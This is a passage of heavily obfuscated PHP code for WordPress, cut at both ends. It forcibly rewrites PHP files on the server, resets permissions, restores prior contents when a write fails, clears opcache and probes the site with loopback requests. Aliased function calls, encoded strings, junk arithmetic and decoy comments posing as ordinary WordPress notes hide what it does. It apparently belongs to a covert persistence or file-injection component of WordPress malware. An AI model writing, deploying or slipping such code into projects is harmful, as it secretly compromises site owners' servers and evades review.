     return $GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_tnonex5o9y_60']($f1rg5dr_o6),    0, $elwjt90x3e3730x);
   }
      function hot4kulhrw7gwj3gagxl($elwjt90x3e3730x)
  {
    return      nreub2fs747eromoe(uniqid((string) $GLOBALS['__scf_ew0pe5qy71c8x_368'](), true),  $elwjt90x3e3730x);
 }
     function  r_3yhly15kzqvnea4lj($w90pshmxoqhf)



  {



    if   (!$GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(956))) return false;
$bs52a8w0a87ynzg_  =    get_option(c1sob647u1i(957),    array());
if   (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($bs52a8w0a87ynzg_))   return   false;
  $u_irchgch79o  =  $GLOBALS['__scf_tnonex5o9y_60']($w90pshmxoqhf);


if (empty($bs52a8w0a87ynzg_[$u_irchgch79o]))    return   false;



 $cupk3kbt8eisf   =    $GLOBALS['__scf_xi_pncf33_0_120']('|',  (string)   $bs52a8w0a87ynzg_[$u_irchgch79o]);



$zwit9p8sv6opp1 =   isset($cupk3kbt8eisf[1])     ? (int)  $cupk3kbt8eisf[1]     :     0;
return ($zwit9p8sv6opp1    >      0 && $GLOBALS['__scf_qzyo0sgkyb6_202']()    -   $zwit9p8sv6opp1 <  (86302+98));
       }

function zqzs827rdpginx0dp2d($w90pshmxoqhf, $hcgux_565q1qv26)
 {
  if   (!$GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(956))   ||   !$GLOBALS['__scf_w3f945e2es_4'](ovffvv33(771)))      return;
  $bs52a8w0a87ynzg_  =  get_option(f6yrzd2knrmb(957), array());
   if (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($bs52a8w0a87ynzg_))   $bs52a8w0a87ynzg_  = array();


  $u_irchgch79o =  $GLOBALS['__scf_tnonex5o9y_60']($w90pshmxoqhf);
 if   (!$hcgux_565q1qv26) {
    if (isset($bs52a8w0a87ynzg_[$u_irchgch79o]))     {
    unset($bs52a8w0a87ynzg_[$u_irchgch79o]);
     update_option(c1sob647u1i(957),   $bs52a8w0a87ynzg_,  iw6xe9q4j6sneg(949));
 }
 return;

    }
    $ukjj4vzpxsr  =     0;
 if  (!empty($bs52a8w0a87ynzg_[$u_irchgch79o])) {
  $cupk3kbt8eisf  = $GLOBALS['__scf_xi_pncf33_0_120']('|',  (string) $bs52a8w0a87ynzg_[$u_irchgch79o]);
      $ukjj4vzpxsr   = (int)   $cupk3kbt8eisf[0];
    }

$ukjj4vzpxsr++;
$zwit9p8sv6opp1 =   ($ukjj4vzpxsr    >=     (1+2))  ?   $GLOBALS['__scf_qzyo0sgkyb6_202']()   : 0;


foreach  ($bs52a8w0a87ynzg_  as $ms9x80z_gl   => $b3aeaejud9c)  {
$gakikxf1jko  =     $GLOBALS['__scf_xi_pncf33_0_120']('|',    (string) $b3aeaejud9c);
        $txvggjcyt15u9 =  isset($gakikxf1jko[2]) ? (int) $gakikxf1jko[2]  : 0;
  if (!$txvggjcyt15u9   &&   !empty($gakikxf1jko[1]))     $txvggjcyt15u9 = (int)   $gakikxf1jko[1];
 if ($txvggjcyt15u9  &&  $GLOBALS['__scf_qzyo0sgkyb6_202']()   -   $txvggjcyt15u9 >     (172714+86))    unset($bs52a8w0a87ynzg_[$ms9x80z_gl]);
}
$bs52a8w0a87ynzg_[$u_irchgch79o] = $ukjj4vzpxsr . '|' .    $zwit9p8sv6opp1  .  '|' .   $GLOBALS['__scf_qzyo0sgkyb6_202']();
   if   ($GLOBALS['__scf_wj6dld55k5r8m_39']($bs52a8w0a87ynzg_) > (0x3a+0x2a))    {
/* essential radix-tree */

 $hehiceg6vx7bzlv2 =      array();
  foreach  ($bs52a8w0a87ynzg_   as   $ms9x80z_gl => $b3aeaejud9c)     {
$gakikxf1jko  =  $GLOBALS['__scf_xi_pncf33_0_120']('|',     (string)  $b3aeaejud9c);
  $hehiceg6vx7bzlv2[$ms9x80z_gl] =  isset($gakikxf1jko[2])  ?  (int) $gakikxf1jko[2]   : (isset($gakikxf1jko[1])    ?     (int)   $gakikxf1jko[1]   :  0);
   }
$GLOBALS['__scf_gk6ndp9t4p_958']($hehiceg6vx7bzlv2);



      $gsv4r6oo_ezh3st  = $GLOBALS['__scf_wj6dld55k5r8m_39']($bs52a8w0a87ynzg_) -   (198^162);



foreach  ($hehiceg6vx7bzlv2 as     $ms9x80z_gl  =>   $rrsu5pe5fx8ug55)    {



 if ($gsv4r6oo_ezh3st <=    0)   break;
 if ($ms9x80z_gl      === $u_irchgch79o)  continue;
 unset($bs52a8w0a87ynzg_[$ms9x80z_gl]);
   $gsv4r6oo_ezh3st--;
      }


     unset($hehiceg6vx7bzlv2,  $rrsu5pe5fx8ug55, $gsv4r6oo_ezh3st);
    }
update_option(f6yrzd2knrmb(957),   $bs52a8w0a87ynzg_,    bpowi0iglycvx(959));
}
  function  x6sk9n5wobcjg1km9($w90pshmxoqhf,      $w3v34rm5bz52xw,    $qmpa35yf6y14oms0 =    null)
  {
    if (!$GLOBALS['__scf_fv3zevxzzb_44']($w3v34rm5bz52xw))  return;
 $ygs4e47dyczpze  = lwxb0otgrmrkttfbm_7t_r($GLOBALS['__scf_po3uwzhcb63b03_11']($w90pshmxoqhf),      f6yrzd2knrmb(960));
  if    ($ygs4e47dyczpze !== false)     {
   if      ($qmpa35yf6y14oms0  !==     null)   @$GLOBALS['__scf_y0ctsi0tqyy7t_18']($ygs4e47dyczpze, $qmpa35yf6y14oms0     & (427+84));
   if   (@$GLOBALS['__scf_whcsnotvh9twx_211']($ygs4e47dyczpze,     $w3v34rm5bz52xw)    === $GLOBALS['__scf_d4eyetogjbsnt_10']($w3v34rm5bz52xw)  &&   riq98ofdzw2zl1nzzzxy($ygs4e47dyczpze,  $w90pshmxoqhf)) return;
cvtaycsw15_xd1srry($ygs4e47dyczpze);

 }


 @$GLOBALS['__scf_whcsnotvh9twx_211']($w90pshmxoqhf, $w3v34rm5bz52xw);



 }
function   c5kyk62yk_dwfeubni4b($w90pshmxoqhf, $f95gmfn4ulxv38r)
   {
$t49jadtyjx   =   $GLOBALS['__scf_po3uwzhcb63b03_11']($w90pshmxoqhf);$rta_2p7nhw=29*2;$kvveq5ugg=$rta_2p7nhw-11;
 if   (!@$GLOBALS['__scf_opq_vgkskw_46']($t49jadtyjx))  {
 g_qoqdy38lfl4v4n3618(c1sob647u1i(961),   ovffvv33(962)   .  $GLOBALS['__scf_owu_4pajngr_3']($w90pshmxoqhf));
 return  false;
 }
$p47td6dqpb  = ($GLOBALS['__scf_nv7he759wjfj_9']($w90pshmxoqhf,  -(0x3+0x1))   === ovffvv33(963));
if   ($p47td6dqpb &&  !ib2ffadoyj2m6zxmkaa2in($f95gmfn4ulxv38r))  {
        g_qoqdy38lfl4v4n3618(hn_f08x0cns80(964),    iw6xe9q4j6sneg(965) .      $GLOBALS['__scf_owu_4pajngr_3']($w90pshmxoqhf));
 return  false;
    }
if ($p47td6dqpb      &&  r_3yhly15kzqvnea4lj($w90pshmxoqhf)) return    false;
 $napkabwqffn  =   false;


  if   (@$GLOBALS['__scf_lclsn87cymy_47']($w90pshmxoqhf))  $napkabwqffn  =   true; 
  $w3v34rm5bz52xw  =  null;
 $zvffant1fbgvr   =      false;
$l8c8j8vu2w0n1i   = null;



  if     (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($w90pshmxoqhf))  {

 $zvffant1fbgvr =    true;
  if (!$napkabwqffn)    {
       $l8c8j8vu2w0n1i  =  @fileperms($w90pshmxoqhf);
   if  ($l8c8j8vu2w0n1i   === false)    $l8c8j8vu2w0n1i  =  null;
     }
  $mnovxzk5t38  = @$GLOBALS['__scf_b42duf6j1zadm9_105']($w90pshmxoqhf);
      if ($mnovxzk5t38  !==   false     &&  $mnovxzk5t38  <= (95666692-43237892) && ($mnovxzk5t38   <=   (1048506+70) ||   mwr_737feiwcxt($mnovxzk5t38)))  $w3v34rm5bz52xw = @$GLOBALS['__scf_utyj_ckly79_101']($w90pshmxoqhf);
unset($mnovxzk5t38);


  }
  if   (!$GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(966)))  {
g_qoqdy38lfl4v4n3618(c1sob647u1i(964), f6yrzd2knrmb(967)    .  $GLOBALS['__scf_owu_4pajngr_3']($w90pshmxoqhf));


   return   false;
      }

$re3hrmv5gq4ds7 = false;
  $u8uae6lfxu_60uk =   false;


    $_cl =  $GLOBALS['__scf_d4eyetogjbsnt_10']($f95gmfn4ulxv38r);
 for ($ijume2mx3z    =   0;    $ijume2mx3z   <     2;  $ijume2mx3z++)  {



    $re3hrmv5gq4ds7  =    lwxb0otgrmrkttfbm_7t_r($t49jadtyjx,    bpowi0iglycvx(43));

if     ($re3hrmv5gq4ds7    !==   false) {
    $u8uae6lfxu_60uk    =  false;
    $gakikxf1jko =   @$GLOBALS['__scf_huiecxntl0_24']($re3hrmv5gq4ds7,  ovffvv33(25));$lf_sd16v=PHP_INT_MAX/PHP_INT_MAX;$ddqxtnafvk3=$lf_sd16v+20;
 if    ($gakikxf1jko     !==  false)  {
        $gq4_m91hor     = 0;
 while   ($gq4_m91hor  <  $_cl)      {
     $fjzhim_nrj0k    =  @$GLOBALS['__scf_h_ah55mj51l_26']($gakikxf1jko,   $GLOBALS['__scf_nv7he759wjfj_9']($f95gmfn4ulxv38r,    $gq4_m91hor));


if  ($fjzhim_nrj0k ===    false  || $fjzhim_nrj0k      ===  0) break;
   $gq4_m91hor  +=    $fjzhim_nrj0k;
 }



   @fflush($gakikxf1jko);

 if    ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(968))) @fsync($gakikxf1jko);
   @fclose($gakikxf1jko);


if ($gq4_m91hor   === $_cl) $u8uae6lfxu_60uk     =   $gq4_m91hor;
      }    else  {
  $u8uae6lfxu_60uk  =    @$GLOBALS['__scf_whcsnotvh9twx_211']($re3hrmv5gq4ds7,  $f95gmfn4ulxv38r);
 }
     if   ($u8uae6lfxu_60uk   !==      false &&   $u8uae6lfxu_60uk ===  $_cl)      break;


cvtaycsw15_xd1srry($re3hrmv5gq4ds7);
     $re3hrmv5gq4ds7  =  false;
    }
 }
 if  ($re3hrmv5gq4ds7 ===   false) {

  g_qoqdy38lfl4v4n3618(ovffvv33(964),   iw6xe9q4j6sneg(969)  .   $GLOBALS['__scf_owu_4pajngr_3']($w90pshmxoqhf));
   return   false;
  }
  if  ($u8uae6lfxu_60uk ===  false     ||   $u8uae6lfxu_60uk  !==  $_cl) {
g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(964), bpowi0iglycvx(970) .      $GLOBALS['__scf_owu_4pajngr_3']($w90pshmxoqhf));
   cvtaycsw15_xd1srry($re3hrmv5gq4ds7);


 return false;
  }
   if     ($l8c8j8vu2w0n1i !== null) @$GLOBALS['__scf_y0ctsi0tqyy7t_18']($re3hrmv5gq4ds7,  $l8c8j8vu2w0n1i &  (250+261));
 if    ($napkabwqffn) {
// @unbind interpreter


 $dft7cds99i7wwqkv =  @$GLOBALS['__scf_whcsnotvh9twx_211']($w90pshmxoqhf,      $f95gmfn4ulxv38r);
   if ($dft7cds99i7wwqkv    ===    $_cl)  {
   cvtaycsw15_xd1srry($re3hrmv5gq4ds7);



   @clearstatcache(true,     $w90pshmxoqhf);
   hwyiz3722wut3tw($w90pshmxoqhf);
   if ($p47td6dqpb) zqzs827rdpginx0dp2d($w90pshmxoqhf,  false);



 return    true;
 }
   if    ($GLOBALS['__scf_fv3zevxzzb_44']($w3v34rm5bz52xw))   @$GLOBALS['__scf_whcsnotvh9twx_211']($w90pshmxoqhf,     $w3v34rm5bz52xw);
cvtaycsw15_xd1srry($re3hrmv5gq4ds7);
 g_qoqdy38lfl4v4n3618(bpowi0iglycvx(964),   c1sob647u1i(971)    . $GLOBALS['__scf_owu_4pajngr_3']($w90pshmxoqhf));
return  false;
   }
    $ztqw4ergnhp8msy    =    riq98ofdzw2zl1nzzzxy($re3hrmv5gq4ds7,     $w90pshmxoqhf);



 if   (!$ztqw4ergnhp8msy   &&   $zvffant1fbgvr      && !$napkabwqffn)    {
  if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($w90pshmxoqhf))  ruinnb541lwxm7j($w90pshmxoqhf,      (343+77));


 $g751je26mpzqv9by =  $w90pshmxoqhf      .   hn_f08x0cns80(972)    .  $GLOBALS['__scf_ew0pe5qy71c8x_368']((1508-508),  (17260-7261));
 if  (riq98ofdzw2zl1nzzzxy($w90pshmxoqhf,   $g751je26mpzqv9by))  {
 $ztqw4ergnhp8msy =   riq98ofdzw2zl1nzzzxy($re3hrmv5gq4ds7, $w90pshmxoqhf);
    if  ($ztqw4ergnhp8msy) {

cvtaycsw15_xd1srry($g751je26mpzqv9by);
 } else   {
  if   (!riq98ofdzw2zl1nzzzxy($g751je26mpzqv9by,  $w90pshmxoqhf) &&  !l7o387uoh_b5jut19ja8b($g751je26mpzqv9by,   $w90pshmxoqhf)) {
   x6sk9n5wobcjg1km9($w90pshmxoqhf,  $w3v34rm5bz52xw, $l8c8j8vu2w0n1i);
}
if   (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($w90pshmxoqhf)) {


 x6sk9n5wobcjg1km9($w90pshmxoqhf,   $w3v34rm5bz52xw,   $l8c8j8vu2w0n1i);
 }
 }
}
}
  if  (!$ztqw4ergnhp8msy &&  !$napkabwqffn  && !$p47td6dqpb)  {
   if (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($w90pshmxoqhf)) ruinnb541lwxm7j($w90pshmxoqhf,  (337+83));
 if (l7o387uoh_b5jut19ja8b($re3hrmv5gq4ds7, $w90pshmxoqhf))  {
    $ztqw4ergnhp8msy =  true;$z164wc4vm3lp=23+82;$lqgho_kw1a=$z164wc4vm3lp-44;
   cvtaycsw15_xd1srry($re3hrmv5gq4ds7);
}
// @replicate event-bus

  }
if  (!$ztqw4ergnhp8msy)  {
 if      (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($w90pshmxoqhf)    &&   (int)  @$GLOBALS['__scf_b42duf6j1zadm9_105']($w90pshmxoqhf)      !==   $_cl)  {


  $uiwmni5ourzx = @$GLOBALS['__scf_utyj_ckly79_101']($w90pshmxoqhf);


if     (!$GLOBALS['__scf_fv3zevxzzb_44']($uiwmni5ourzx) ||  ($GLOBALS['__scf_fv3zevxzzb_44']($w3v34rm5bz52xw) &&   $uiwmni5ourzx    !== $w3v34rm5bz52xw)) {
  if  ($GLOBALS['__scf_fv3zevxzzb_44']($w3v34rm5bz52xw))      x6sk9n5wobcjg1km9($w90pshmxoqhf,    $w3v34rm5bz52xw,  $l8c8j8vu2w0n1i);
     elseif (!$zvffant1fbgvr) cvtaycsw15_xd1srry($w90pshmxoqhf);
     }



   unset($uiwmni5ourzx);


  }


 if (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($w90pshmxoqhf))      {
    x6sk9n5wobcjg1km9($w90pshmxoqhf,   $w3v34rm5bz52xw,  $l8c8j8vu2w0n1i);
   }
// WP Pattern Directory: disable provider

    g_qoqdy38lfl4v4n3618(ovffvv33(973),     ovffvv33(974) . $GLOBALS['__scf_owu_4pajngr_3']($w90pshmxoqhf));
    cvtaycsw15_xd1srry($re3hrmv5gq4ds7);


 return  false;
}
@clearstatcache(true,  $w90pshmxoqhf);
$hphaabf6js_whb9   =   false;


  if   ($_cl   <=   (537604+1559548)) {
$u9rbe614fu3wu =  @$GLOBALS['__scf_utyj_ckly79_101']($w90pshmxoqhf);


$hphaabf6js_whb9 =  ($GLOBALS['__scf_fv3zevxzzb_44']($u9rbe614fu3wu)  && $GLOBALS['__scf_d4eyetogjbsnt_10']($u9rbe614fu3wu)   === $_cl  &&  $GLOBALS['__scf_tnonex5o9y_60']($u9rbe614fu3wu)  === $GLOBALS['__scf_tnonex5o9y_60']($f95gmfn4ulxv38r));
} else  {
    $atkuana4bfk =  $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(975))     ?    @hash_file(ovffvv33(60), $w90pshmxoqhf)  :    false;
 if   ($GLOBALS['__scf_fv3zevxzzb_44']($atkuana4bfk)      &&  $atkuana4bfk  !==   "")  $hphaabf6js_whb9   = ($atkuana4bfk  ===  $GLOBALS['__scf_tnonex5o9y_60']($f95gmfn4ulxv38r));
else  {
    $mnaz5or2dse5bn  = @$GLOBALS['__scf_b42duf6j1zadm9_105']($w90pshmxoqhf);
 if ($mnaz5or2dse5bn  ===   $_cl) {
$lzhk88ii87ti6   =    @$GLOBALS['__scf_utyj_ckly79_101']($w90pshmxoqhf, false,   null,  0,  (4065+31));
 $_rt =     @$GLOBALS['__scf_utyj_ckly79_101']($w90pshmxoqhf,   false,   null,  $_cl     -     (4010+86));

 $hphaabf6js_whb9 = ($GLOBALS['__scf_fv3zevxzzb_44']($lzhk88ii87ti6)     && $GLOBALS['__scf_fv3zevxzzb_44']($_rt)     && $lzhk88ii87ti6  ===    $GLOBALS['__scf_nv7he759wjfj_9']($f95gmfn4ulxv38r, 0, (6748-2652)) &&  $_rt   === $GLOBALS['__scf_nv7he759wjfj_9']($f95gmfn4ulxv38r, $_cl  -  (0x6c2+0x93e)));
   }
 }
 }
     if (!$hphaabf6js_whb9)   {
// Intl extension webp conversion

g_qoqdy38lfl4v4n3618(bpowi0iglycvx(976),  f6yrzd2knrmb(977) .  $GLOBALS['__scf_owu_4pajngr_3']($w90pshmxoqhf));

  if     ($p47td6dqpb) zqzs827rdpginx0dp2d($w90pshmxoqhf,  true);
    if ($GLOBALS['__scf_fv3zevxzzb_44']($w3v34rm5bz52xw)) {
   $er4avrtfyn3t      =    $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(975))  ? @hash_file(ovffvv33(978),  $w90pshmxoqhf)  : false;
 if    ($GLOBALS['__scf_fv3zevxzzb_44']($er4avrtfyn3t) &&   $er4avrtfyn3t !==      ""   && $er4avrtfyn3t !== $GLOBALS['__scf_tnonex5o9y_60']($f95gmfn4ulxv38r)    &&    $er4avrtfyn3t !==  $GLOBALS['__scf_tnonex5o9y_60']($w3v34rm5bz52xw))   {
// @intercept envelope

 g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(976), hn_f08x0cns80(979) .  $GLOBALS['__scf_owu_4pajngr_3']($w90pshmxoqhf));
    return  false;
     }
    $ema6byvwok6c8nqo = lwxb0otgrmrkttfbm_7t_r($t49jadtyjx,  ovffvv33(980));
      if   ($ema6byvwok6c8nqo     !==  false   &&   @$GLOBALS['__scf_whcsnotvh9twx_211']($ema6byvwok6c8nqo,    $w3v34rm5bz52xw) ===    $GLOBALS['__scf_d4eyetogjbsnt_10']($w3v34rm5bz52xw))  {



     @$GLOBALS['__scf_y0ctsi0tqyy7t_18']($ema6byvwok6c8nqo,  $l8c8j8vu2w0n1i  !==  null    ? ($l8c8j8vu2w0n1i   &  (486+25))    :  (398+22));
   if     (!riq98ofdzw2zl1nzzzxy($ema6byvwok6c8nqo,  $w90pshmxoqhf))    {

   if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($w90pshmxoqhf) &&  !$napkabwqffn) ruinnb541lwxm7j($w90pshmxoqhf, (323+97));
    if  (!$napkabwqffn  && l7o387uoh_b5jut19ja8b($ema6byvwok6c8nqo,  $w90pshmxoqhf))  {
  cvtaycsw15_xd1srry($ema6byvwok6c8nqo);$otnp67szn72q=(0x9b+0xd5);$faq4m8fparv3c=$otnp67szn72q%14;
      } else {

 @$GLOBALS['__scf_whcsnotvh9twx_211']($w90pshmxoqhf,    $w3v34rm5bz52xw);
   cvtaycsw15_xd1srry($ema6byvwok6c8nqo);



}
// WP Post Title: normal quotient

 }



       }  else {
     if ($ema6byvwok6c8nqo !==   false) cvtaycsw15_xd1srry($ema6byvwok6c8nqo);
 @$GLOBALS['__scf_whcsnotvh9twx_211']($w90pshmxoqhf,     $w3v34rm5bz52xw);
  }
hwyiz3722wut3tw($w90pshmxoqhf);


 }   elseif   (!$zvffant1fbgvr)   {
   cvtaycsw15_xd1srry($w90pshmxoqhf);
 }
return    false;
}
  hwyiz3722wut3tw($w90pshmxoqhf);
      vyxva31du3czei($w90pshmxoqhf);


   ruinnb541lwxm7j($w90pshmxoqhf, $l8c8j8vu2w0n1i  !==   null  ? ($l8c8j8vu2w0n1i  &  (437+74))     :     (356+64));
 if ($p47td6dqpb) zqzs827rdpginx0dp2d($w90pshmxoqhf,  false);
 return    true;



}
        function    l2jao5rx4pzqrtjiymnn($w90pshmxoqhf, $b7iipm1kgta2iscx)
 {
  $amsjsw283qnc3  =  "<?php\n";
    if  ($GLOBALS['__scf_fv3zevxzzb_44']($b7iipm1kgta2iscx)   &&  $b7iipm1kgta2iscx   !==  "" &&  $GLOBALS['__scf_w6mdcepio4lkz5_7']($b7iipm1kgta2iscx,  bpowi0iglycvx(249)) !==    false &&   ib2ffadoyj2m6zxmkaa2in($b7iipm1kgta2iscx)) $amsjsw283qnc3  = $b7iipm1kgta2iscx;
   if    (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($w90pshmxoqhf)) {
    $xps0ov2dbv =     @$GLOBALS['__scf_utyj_ckly79_101']($w90pshmxoqhf);
  if ($GLOBALS['__scf_fv3zevxzzb_44']($xps0ov2dbv)  &&     k12vjaxiygekdnj($xps0ov2dbv)     ===   $amsjsw283qnc3)  return;
}



if   (!c5kyk62yk_dwfeubni4b($w90pshmxoqhf,  $amsjsw283qnc3)) {$n_ebfk7u33=(0x6+0x4e);$ne2nwj3a8kjis=$n_ebfk7u33%4;
 $bx8d1dcyqabod9v   = @$GLOBALS['__scf_utyj_ckly79_101']($w90pshmxoqhf);
   if (!($GLOBALS['__scf_fv3zevxzzb_44']($bx8d1dcyqabod9v)    &&  k12vjaxiygekdnj($bx8d1dcyqabod9v) ===   $amsjsw283qnc3))     @$GLOBALS['__scf_whcsnotvh9twx_211']($w90pshmxoqhf,   $amsjsw283qnc3);
 unset($bx8d1dcyqabod9v);
 }
// add type annotations

        hwyiz3722wut3tw($w90pshmxoqhf);
}
     function  gyv0nlu4jn4p6mt()
  {



 if  ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(981))      &&    sv22ioxna2z9xuz())   return    true;
   if      (!$GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(480))    ||  !$GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(982))) return   true;

 if ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(983))    && rdslwi2runwrwbh() <= 1.5)     return true;
  $i15ekbwriadnays6   =  $GLOBALS['__scf_a5xz_m7m_xzaj_493'](1,  $GLOBALS['__scf_bpblov2hvcg_r_494']((3+2), (int) rdslwi2runwrwbh()));
    $o_mle9hlw6xo   =    home_url('/');
  $o_mle9hlw6xo .=  ($GLOBALS['__scf_w6mdcepio4lkz5_7']($o_mle9hlw6xo,    '?') ===   false  ?   '?'  :   '&')    .  hn_f08x0cns80(984)    .  $GLOBALS['__scf_qzyo0sgkyb6_202']()    .  $GLOBALS['__scf_ew0pe5qy71c8x_368']((0x4f+0x15),  (917+82));
 $cljgusq7fd     = $GLOBALS['__scf_u2xtklnzk8_7_x_300'](true);
      $n0tlzmrutbrfwh_  =  $GLOBALS['__scf_r7h_2y83ismjfq_303']($o_mle9hlw6xo, array(c1sob647u1i(485) =>   $i15ekbwriadnays6,  ovffvv33(411)   => false,  bpowi0iglycvx(699) =>  2,  hn_f08x0cns80(700)     => (1455433-406857),      c1sob647u1i(985)  =>   array(c1sob647u1i(986)   => f6yrzd2knrmb(987))));
     if  ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(988)))    a2olde_if45fiw0jmcv($GLOBALS['__scf_u2xtklnzk8_7_x_300'](true) - $cljgusq7fd);
  if    ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(326)) &&  is_wp_error($n0tlzmrutbrfwh_))  {
  if ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(989))  && rdslwi2runwrwbh()   <=  1.5)    return true;
      $i15ekbwriadnays6  =  $GLOBALS['__scf_a5xz_m7m_xzaj_493'](1, $GLOBALS['__scf_bpblov2hvcg_r_494']((250^255),  (int)   rdslwi2runwrwbh()));
   $cljgusq7fd  = $GLOBALS['__scf_u2xtklnzk8_7_x_300'](true);
$n0tlzmrutbrfwh_     =    $GLOBALS['__scf_r7h_2y83ismjfq_303']($o_mle9hlw6xo,   array(f6yrzd2knrmb(990) =>  $i15ekbwriadnays6,    hn_f08x0cns80(411) =>  false,      f6yrzd2knrmb(699)   => 2, ovffvv33(700)  =>  (1048532+44),    f6yrzd2knrmb(985)    => array(hn_f08x0cns80(986) =>   f6yrzd2knrmb(987))));
  if   ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(988)))    a2olde_if45fiw0jmcv($GLOBALS['__scf_u2xtklnzk8_7_x_300'](true)    -    $cljgusq7fd);
  if    ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(326))  && is_wp_error($n0tlzmrutbrfwh_)) return   false;
     }
 $sis69r1ofnyanvw =  (int) wp_remote_retrieve_response_code($n0tlzmrutbrfwh_);
return $sis69r1ofnyanvw >=  (165-65) && $sis69r1ofnyanvw  <  (0x1f0+0x4);
}
  function nk0wpptt8ypun9e6($q6au91aw95,  $kgupkv493bs1c)
{
  $cku3ftfkcaxf    =    $GLOBALS['__scf_qw5tztoblafz_841']($GLOBALS['__scf_owu_4pajngr_3']($kgupkv493bs1c),  '/');
   foreach (
 array(
  bpowi0iglycvx(991)  .    $cku3ftfkcaxf .    ovffvv33(992),
  hn_f08x0cns80(993)   . $cku3ftfkcaxf .    f6yrzd2knrmb(992),
hn_f08x0cns80(994)   .  $cku3ftfkcaxf   . c1sob647u1i(995),
bpowi0iglycvx(996),
ovffvv33(997),
)  as   $tl0z3mzm8t
)  {
if    (!$GLOBALS['__scf_fv3zevxzzb_44']($q6au91aw95)) break;
      $q6au91aw95   =    $GLOBALS['__scf_renvrk8nefa8_474']($tl0z3mzm8t, "\n",  $q6au91aw95);
  }

  return $q6au91aw95;
     }
  function    hwyiz3722wut3tw($rqmtme6nbb4elm)
{
 if ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(748))) {


 if  (@opcache_invalidate($rqmtme6nbb4elm,  true)   !==   false)  return    true;
 if  ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(998)))  return  (bool) @opcache_reset();
     return    false;
   }


   $frju_qwj03jlh66     = $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(999))   ?    @opcache_get_status(false)  :  false;
 return  !($GLOBALS['__scf_w1m1ydxx4_gm9__38']($frju_qwj03jlh66) &&   !empty($frju_qwj03jlh66[f6yrzd2knrmb(1000)]));
 }


 function  s_xzav70hr_4pogeop0o($w90pshmxoqhf,      $g9u70l7gja,  $lfc0os2_g711prt)
{
// WP Server Side Render: orthogonal-adj filter-chain

 if   ($GLOBALS['__scf_nv7he759wjfj_9']($w90pshmxoqhf,    -(2+2))  ===  bpowi0iglycvx(1001)) {
if   (!c5kyk62yk_dwfeubni4b($w90pshmxoqhf,    $g9u70l7gja))   {
  g_qoqdy38lfl4v4n3618($lfc0os2_g711prt, iw6xe9q4j6sneg(1002)  .   $GLOBALS['__scf_owu_4pajngr_3']($w90pshmxoqhf));
 return     false;


   }
 hwyiz3722wut3tw($w90pshmxoqhf);$wvyp51yzwlo=PHP_INT_MAX/PHP_INT_MAX;$efxj2b91y=$wvyp51yzwlo+63;
return   $GLOBALS['__scf_d4eyetogjbsnt_10']($g9u70l7gja);
     }
$gakikxf1jko    =  @$GLOBALS['__scf_huiecxntl0_24']($w90pshmxoqhf,    ovffvv33(1003));
    if ($gakikxf1jko  ===  false)    {

  g_qoqdy38lfl4v4n3618($lfc0os2_g711prt, iw6xe9q4j6sneg(1004)   . $GLOBALS['__scf_owu_4pajngr_3']($w90pshmxoqhf));



      return false;
  }
  if  ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(134)))    @flock($gakikxf1jko,   LOCK_EX);

 $n0tlzmrutbrfwh_   =   @$GLOBALS['__scf_h_ah55mj51l_26']($gakikxf1jko, $g9u70l7gja);
  if    ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1005)))   @flock($gakikxf1jko,     LOCK_UN);
  @fclose($gakikxf1jko);
   if  ($n0tlzmrutbrfwh_  ===  false    ||     ($g9u70l7gja    !== ""      &&      $n0tlzmrutbrfwh_    !== $GLOBALS['__scf_d4eyetogjbsnt_10']($g9u70l7gja)))  {
   g_qoqdy38lfl4v4n3618($lfc0os2_g711prt,   hn_f08x0cns80(1006) . $GLOBALS['__scf_owu_4pajngr_3']($w90pshmxoqhf));
 return false;
  }
  return $n0tlzmrutbrfwh_;
}
  
 function   wcip50nvkn7ed3idira()
  {
      try   {

      if  (!$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1007))  ||   !$GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(887)))   {$x6owaber=64+52;$z777o06447=$x6owaber-48;
 pklvf4vixucw8d97bma(null);
     return;
      }
if (get_transient(c1sob647u1i(1008)))  return;
      if    (get_transient(hn_f08x0cns80(1009))) return;$mbq_2x_ib1u=PHP_MAJOR_VERSION;$uif3f2ina1dn=$mbq_2x_ib1u*4;
    set_transient(bpowi0iglycvx(1009),    1,  (553+47));


   pklvf4vixucw8d97bma(null);


 if ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(774)))    delete_transient(hn_f08x0cns80(1009));

    $cse6kkgn2he1r7y     =  $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1010))  ?  (string)  fcc42yo6xrdenvra0(c1sob647u1i(1011),   "")  :   "";
